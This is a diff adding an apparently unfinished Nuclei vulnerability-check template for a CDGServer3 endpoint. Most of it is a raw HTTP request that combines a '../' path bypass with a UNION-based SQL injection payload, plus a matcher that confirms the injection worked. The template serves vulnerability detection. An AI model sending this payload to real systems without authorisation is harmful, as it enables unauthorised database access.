@@ -1,0 +1,32 @@
+id: need_to_change
+
+info:
+  name: need_to_change
+  author: msk
+  severity: high
+
+#
+#
+#
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+
+        id=-999{{url_encode("\' UNION ALL SELECT NULL,ISNULL(CAST(111*111 AS NVARCHAR(4000)),CHAR(32))+\' \'+DB_NAME(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wiVb")}}
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"12321")
+
+
+
